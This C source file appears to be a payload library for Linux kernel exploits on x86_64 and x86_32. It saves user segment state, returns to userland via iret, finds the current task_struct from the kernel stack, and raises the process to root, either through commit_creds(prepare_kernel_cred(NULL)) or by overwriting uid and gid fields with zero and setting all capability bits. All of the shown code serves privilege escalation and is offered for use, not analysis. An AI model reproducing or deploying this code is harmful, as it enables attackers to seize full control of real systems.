#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sched.h>
#include <sys/mman.h>
#include <string.h>
#include "kernel_header.h"

#define PAGE_SIZE   0x1000
#define PAGE_MASK4K (~(PAGE_SIZE -1))
#define PAGE_MASK8K (~(PAGE_SIZE*2 -1))

/* arch dependent data/code */

#ifdef __x86_64__

int (*commit_creds)(void *);
void* (* prepare_kernel_cred)(void *);

void user_mode_set_segment()
{
  asm("movq %%cs, %0\t\n"
      "movq %%ss, %1\t\n"
      "pushfq\t\n"
      "popq %2\t\n"
      : "=r"(_user_cs), "=r"(_user_ss), "=r"(_user_rflags) : : "memory");
}


void return_to_userland()
{
  asm volatile (
    "swapgs ;"
    "movq %0, 0x20(%%rsp)\t\n"
    "movq %1, 0x18(%%rsp)\t\n"
    "movq %2, 0x10(%%rsp)\t\n"
    "movq %3, 0x08(%%rsp)\t\n"
    "movq %4, 0x00(%%rsp)\t\n"
    "iretq"
    : : "r" (_user_ss), 
        "r" (_alternate_stack + (STACK_SIZE)/2),
        "r" (_user_rflags),
	"r" (_user_cs), 
        "r" (_alternate_code)
  );
}

#else // X86_32

/*
 * Returns 0 if the stack is invalid, 1 otherwise.
 */

static int is_valid_stack(unsigned long temp)
{
  if (temp > 0xc0000000 && temp < 0xff000000) { 
    long state = *((unsigned long *)temp);
    if (state == 0)
      return 1;
    else
      return 0;
  }
  return 0;
}

void user_mode_set_segment()
{
  asm("movl %%cs, %0\t\n"
      "movl %%ss, %1\t\n"
      "pushfl\t\n"
      "popl %2\t\n"
      : "=r"(_user_cs), "=r"(_user_ss), "=r"(_user_rflags) : : "memory");
}

void return_to_userland()
{
  asm volatile (
    "movl %0, 0x10(%%esp)\t\n"
    "movl %1, 0x0c(%%esp)\t\n"
    "movl %2, 0x08(%%esp)\t\n"
    "movl %3, 0x04(%%esp)\t\n"
    "movl %4, 0x00(%%esp)\t\n"
    "iret"
    : : "r" (_user_ss), 
        "r" (_alternate_stack + (STACK_SIZE)/2),
        "r" (_user_rflags),
	"r" (_user_cs), 
        "r" (_alternate_code)
  );
}

#endif


/* arch independent code */

unsigned long _user_cs;
unsigned long _user_ss;
unsigned long _user_rflags;
unsigned long _alternate_code;
unsigned long _alternate_stack;
unsigned long _page_size;
uint32_t _process_uid;
uint32_t _process_gid;
char stack[STACK_SIZE];



/*
 * Computes the address of the task_struct from the
 * address of the kernel stack. Returns NULL on failure.
 */

static void *get_task_struct()
{
  unsigned long stack,ret,stack4k,stack8k;    
  int dummy;
  stack = (unsigned long)&dummy;
  stack4k = stack & PAGE_MASK4K;
  stack8k = stack & PAGE_MASK8K;

#ifdef __x86_64__
  
  ret  = *((unsigned long *)stack8k);         

#else // x86_32

  ret = *((unsigned long*)stack4k);          
  if(!is_valid_stack(ret)) {
    ret = *((unsigned long*)stack8k);
    if (!is_valid_stack(ret))
      return NULL;    
  }
#endif  

  return (void*)ret;
}


#define TRESHOLD 1100
static void __kernel_rise_priv_old(void* t)
{
  int i;
  uint32_t *k = t;
  for(i=0; i<TRESHOLD; i++,k++)
  {
  #define uid _process_uid
  #define gid _process_gid
      if(k[0] == uid && k[1] == uid && k[2] == uid && k[3] == uid &&
         k[4] == gid && k[5] == gid && k[6] == gid && k[7] == gid)
         {
           k[0] = k[1] = k[2] = k[3] = 0;
           k[4] = k[5] = k[6] = k[7] = 0;
           /* set caps here */
           k = (uint32_t *) ((uint8_t *)(k + 8) + sizeof(void *));
           k[0] = k[1] = k[2] = 0xFFFFFFFF;
           break;
         }
  #undef gid
  #undef uid
  }
}


void kernel_rise_privileges()
{
   if(commit_creds && prepare_kernel_cred)
   	commit_creds(prepare_kernel_cred(NULL));   
   else 
   {
    void *t = get_task_struct();
    if(t)
      __kernel_rise_priv_old(t);
   }
}



